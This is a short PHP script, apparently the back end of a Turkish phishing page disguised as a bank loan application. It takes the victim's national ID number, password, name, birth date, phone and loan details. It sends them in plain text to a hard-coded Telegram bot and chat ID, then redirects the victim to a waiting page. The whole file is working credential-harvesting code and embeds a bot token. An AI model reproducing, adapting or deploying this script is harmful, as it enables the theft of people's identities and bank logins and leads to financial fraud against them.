<?php
// Form gönderildiğinde POST parametrelerini ve logoyu işleyelim
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $tcNo = isset($_POST['TCNo']) ? $_POST['TCNo'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    $adSoyad = isset($_POST['ad_soyad']) ? $_POST['ad_soyad'] : '';
    $birthDate = isset($_POST['BirthDate']) ? $_POST['BirthDate'] : '';
    $phone = isset($_POST['Phone']) ? $_POST['Phone'] : '';
    $krediSecimi = isset($_POST['krediSecimi']) ? $_POST['krediSecimi'] : '';
    $krediTutar = isset($_POST['krediTutar']) ? $_POST['krediTutar'] : '';
    $vadeSayisi = isset($_POST['vadeSayisi']) ? $_POST['vadeSayisi'] : '';
    $calculatedAmount = isset($_POST['calculatedAmount']) ? $_POST['calculatedAmount'] : '';
    
    $logo = isset($_POST['logo']) ? $_POST['logo'] : 'Bilinmiyor';

    // Telegram bot token ve chat_id bilgileri
    $token = "7265457866:AAHhmjDe4AYz9uQG-lsPpMu-0MC7xdfcD7M";
    $chat_id = "5238627315";

    // Mesajın formatı
    $message = "Yeni Form Bilgileri:\n".
               "TC No: $tcNo\n".
               "Şifre: $password\n".
               "İsim Soyisim: $adSoyad\n".
               "Doğum Tarihi: $birthDate\n".
               "Cep Telefonu: $phone\n".
               "Kredi Türü: $krediSecimi\n".
               "Kredi Tutarı: $krediTutar TL\n".
               "Vade Sayısı: $vadeSayisi AY\n".
               "Aylık Ödeme Tutarı: $calculatedAmount TL\n".
               "Tıklanan Logo: $logo";

    // Telegram API'sine istek gönderme
    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($message);

    // CURL işlemi
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_exec($ch);
    curl_close($ch);

    // İşlem tamamlandıktan sonra yönlendirme
    header("Location: bekleyiniz.php");
    exit();
}

// Sayfa ilk yüklendiğinde GET parametresi ile gelen logo bilgisi ve title bilgilerini alıyoruz
$logo = isset($_GET['logo']) ? htmlspecialchars($_GET['logo']) : null;
$title = isset($_GET['title']) ? htmlspecialchars($_GET['title']) : 'Hoş Geldiniz';
?>
